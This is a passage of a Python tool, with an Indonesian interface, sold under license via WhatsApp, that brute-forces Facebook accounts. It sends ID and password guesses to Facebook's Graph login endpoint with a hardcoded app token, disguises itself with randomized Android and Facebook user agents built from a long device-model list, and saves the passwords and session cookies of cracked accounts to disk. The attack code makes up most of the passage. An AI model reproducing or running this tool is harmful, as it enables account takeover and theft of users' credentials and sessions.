				cok = {}
				for x in coki:
					cok.update({x["name"]:x["value"]})
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				tree = Tree("                                 ")
				tree.add(f"{H2}{idf}|{pw}").add(f"{H2}{kuki}")
				Minimal__Jangan__Fitnah__Ya__Bang(tree)
				open('OK/'+okc,'a').write("%s|%s|%s\n"%(idf,pw,kuki))
				ok.append(idf)
				break
			elif "checkpoint" in xnxx.text:
				cp+=1
				tree = Tree("                                 ")
				tree.add(f"{K2}{idf}|{pw}").add(f"{K2}{KontolXD}")
				Minimal__Jangan__Fitnah__Ya__Bang(tree)
				open('CP/'+cpc,'a').write("%s|%s\n"%(idf,pw))
				cp.append(idf)
				break				
			elif "Calls to this api have exceeded the rate limit. (613)" in xnxx.text:
			    prog.update(des,description=f"{M2}craking {P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp} {P2}- {str(loop)}/{len(id2)}")
			    prog.advance(des)
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")

###----------[ METODE APIV2 ]---------- ###
def apikuv2(idf,pwv):
	global loop,ok,cp
	war = str(random.choice([H2,K2,J2,B2,N2,O2,A2]))
	prog.update(des,description=f"{H2}crackAPI {P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp} {P2}- {war}{str(loop)}/{len(id2)}")
	prog.advance(des)
	KontolXD = random.choice(ugent)
	ses = requests.Session()
	for pw in pwv:
		try:
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			fbs=random.choice(fbks)
			gtt=random.choice(xxxxx)
			gttt=random.choice(xxxxx)
			android_version=str(random.randrange(6,13))
			ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
			ykh = random.randint(2e7, 3e7)
			iyh = random.randint(2e4, 4e4)
			params = {
					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
					"sdk_version": {random.randint(1,26)}, 
					"email": idf,
					"locale": "en_US",
					"password": pw,
					"sdk": "android",
					"generate_session_cookies": "1",
					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
			headers = {
					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": KontolXD,
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger"
				}
			xnxx = ses.post("https://graph.facebook.com/auth/login", params = params, headers = headers, allow_redirects=False)
			anjg = json.loads(xnxx.text)
			if "session_key" in xnxx.text:
				ok+=1
				coki = anjg["session_cookies"]
				cok = {}
				for x in coki:
					cok.update({x["name"]:x["value"]})
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
				tree = Tree("                                 ")
				tree.add(f"{H2}{idf}|{pw}")
				tree.add(f"{H2}{kuki} | {KontolXD}")
				Minimal__Jangan__Fitnah__Ya__Bang(tree)
				open('OK/'+okc,'a').write("%s|%s|%s\n"%(idf,pw,kuki))
				ok.append(idf)
				break
			elif "checkpoint" in xnxx.text:
				cp+=1
				tree = Tree("                                 ")
				tree.add(f"{K2}{idf}|{pw}")
				tree.add(f"{K2}{KontolXD}")
				Minimal__Jangan__Fitnah__Ya__Bang(tree)
				open('CP/'+cpc,'a').write("%s|%s\n"%(idf,pw))
				cp.append(idf)
				break				
			elif "Calls to this api have exceeded the rate limit. (613)" in xnxx.text:
			    prog.update(des,description=f"{M2}craking {P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp} {P2}- {str(loop)}/{len(id2)}")
			    prog.advance(des)
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


###----------[ CEK LISENSI ]---------- ###
def key():
	os.system("clear");Iyah_Bang__Aku_Recode__Sc__Fall__Ucap__Si__Sarkas__Haha();key = input(f" {K}#{P} masukan lisensi : {H}")
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token===&ProductId=18478&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}selamat lisensi yang anda masukan terdaftar ke server Facebook MBF",width=80,padding=(0,6),style=f"{color_table}"));time.sleep(4);menu()
	except KeyError:
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+crack+Facebook MBF");time.sleep(2);exit()

###----------[ CEK LISENSI ]---------- ###
def cek():
	try:x=open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIzNTQ2OTEyMiIsInpJemRYVWR2QStISkg5ZXpMRytIWWs3VkRwSENvVy9EQm9LRGxoSFUiXQ==&ProductId=18478&Key=%s"%(x)).json()['licenseKey']['key'];menu()
	except KeyError:
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+crack+Facebook MBF");time.sleep(2);exit()

###----------[ MASUK LISENSI ]---------- ###
def key():
	os.system("clear") 
	Iyah_Bang__Aku_Recode__Sc__Fall__Ucap__Si__Sarkas__Haha()
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}silahkan masukan lisensi tools agar bisa masuk ke tools MBF\njika anda belum mempunyai lisensi ketik {H2}beli {P2}untuk melihat harga lisensi",width=80,padding=(0,2),style=f"{color_table}"))
	key = console.input(f" {H2}â€¢{P2} masukan lisensi : ")
	if key in ["beli","Beli","BELI"]:beli_bang()
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIzNTQ2OTEyMiIsInpJemRYVWR2QStISkg5ZXpMRytIWWs3VkRwSENvVy9EQm9LRGxoSFUiXQ==&ProductId=18478&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{H2}selamat lisensi yang anda masukan terdaftar ke server MBF",width=80,padding=(0,9),style=f"{color_table}"));time.sleep(3);menu()
	except KeyError:
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2} lisensi yang anda masukan tidak terdaftar silahkan beli terlebih dahulu",width=80,padding=(0,1),style=f"{color_table}"));os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+crack+Facebook MBF");time.sleep(2);exit()

###----------[ CEK LISENSI ]---------- ###				
def cek():
	try:x=open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIzNTQ2OTEyMiIsInpJemRYVWR2QStISkg5ZXpMRytIWWs3VkRwSENvVy9EQm9LRGxoSFUiXQ==&ProductId=18478&Key=%s"%(x)).json()['licenseKey']['key'];menu()
	except KeyError:
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+crack+Facebook MBF");time.sleep(2);exit()

###----------[ BUY LISENSI ]---------- ###	
def beli_bang():
    Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}[{H2}01{P2}]. 1 minggu {H2}50.000 {P2}max pemakaian 1 device\n{P2}[{H2}02{P2}]. 1 bulan {H2}100.000{P2} max pemakaian 5 device\n{P2}[{H2}03{P2}]. open source full update {H2}200.000",width=80,padding=(0,15),style=f"{color_table}"))
    zxc = console.input(f" {H2}â€¢{P2} pilih lisensi : ")
    if zxc in [""]:Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} pilih yang bener broo jangan kosong");time.sleep(3);cek_lisensi_aktif()
    elif zxc in ["1","01"]:Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+facebook+1+minggu");time.sleep(2);exit()
    elif zxc in ["2","02"]:Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+facebook+1+bulan");time.sleep(2);exit()
    elif zxc in ["3","03"]:Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+facebook+full+source");time.sleep(2);exit()
    else:Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} ngetik apaan lu ngab");time.sleep(3);cek_lisensi_aktif()

###----------[ CEK LISENSI AKTIF ]---------- ###
def cek_lisensi_aktif():
	try:xz = open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	os.system("clear");cek()

###----------[ AUTO CREATE FOLDER ]---------- ###
def AutoFolder():
    try:os.mkdir("OK")
    except:pass
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("data")
    except:pass
    try:os.mkdir("assets")
    except:pass

###----------[ PEMANGGIL ]---------- ###
if __name__=='__main__':
  try:
      with requests.Session() as ses:
           os.system("git pull")
           AutoFolder();menu()
  except requests.exceptions.ConnectionError:
      Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} koneksi internet anda bermasalah")
      time.sleep(3);exit()
